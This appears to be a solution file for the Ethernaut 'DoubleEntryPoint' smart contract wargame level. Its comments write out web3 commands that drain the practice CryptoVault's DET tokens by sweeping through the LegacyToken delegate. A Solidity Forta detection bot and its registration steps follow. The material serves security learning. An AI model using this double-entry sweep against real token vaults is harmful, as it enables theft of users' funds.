// In this level you should figure out where the bug is in CryptoVault and protect it from being drained out of tokens.
// Your job is to implement a detection bot and register it in the Forta contract. The bot's implementation will need to raise correct alerts to prevent potential attacks or bug exploits.
// Things that might help:

// How does a double entry point work for a token contract?

// read here for more >>> https://blog.dixitaditya.com/ethernaut-level-26-doubleentrypoint
// read here for more >>> https://dev.to/nvn/ethernaut-hacks-level-26-double-entry-point-1774

// So we can indirectly sweep the underlying tokens through transfer() of LegacyToken contract. We simply call sweepToken with address of LegacyToken contract. That in turn would make the LegacyContract to call the DoubleEntryPoint's (DET token) delegateTransfer() method.
// vault = await contract.cryptoVault()

// // Check initial balance (100 DET)
// await contract.balanceOf(vault).then(v => v.toString()) // '100000000000000000000'

// legacyToken = await contract.delegatedFrom()

// // sweepTokens(..) function call data
// sweepSig = web3.eth.abi.encodeFunctionCall({
//     name: 'sweepToken',
//     type: 'function',
//     inputs: [{name: 'token', type: 'address'}]
// }, [legacyToken])

// // Send exploit transaction
// await web3.eth.sendTransaction({ from: player, to: vault, data: sweepSig })

// // Check balance (0 DET)
// await contract.balanceOf(vault).then(v => v.toString()) // '0'

// This worked because during invocation transfer() of LegacyToken the msg.sender was CryptoVault. And when delegateTransfer() invoked right after, the origSender is the passed in address of CryptoVault contract and msg.sender is LegacyToken so onlyDelegateFrom modifier checks out.
// Now to prevent this exploit we have to write a bot which would be a simple contract implementing the IDetectionBot interface. In the bot's handleTransaction(..) we could simply check that the address was not CryptoVault address. If so, raise alert. Hence preventing sweep.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IForta {
    function raiseAlert(address user) external;
}

contract FortaDetectionBot {
    address private cryptoVault;

    constructor(address _cryptoVault) {
        cryptoVault = _cryptoVault;
    }

    function handleTransaction(address user, bytes calldata msgData) external {
        // Extract the address of original message sender
        // which should start at offset 168 (0xa8) of calldata
        address origSender;
        assembly {
            origSender := calldataload(0xa8)
        }

        if (origSender == cryptoVault) {
            IForta(msg.sender).raiseAlert(user);
        }
    }
}


// FortaDetectionBot
// botAddr = '0x...'

// // Forta contract address
// forta = await contract.forta()

// // setDetectionBot() function call data
// setBotSig = web3.eth.abi.encodeFunctionCall({
//     name: 'setDetectionBot',
//     type: 'function',
//     inputs: [
//         { type: 'address', name: 'detectionBotAddress' }
//     ]
// }, [botAddr])

// // Send the transaction setting the bot
// await web3.eth.sendTransaction({from: player, to: forta, data: setBotSig })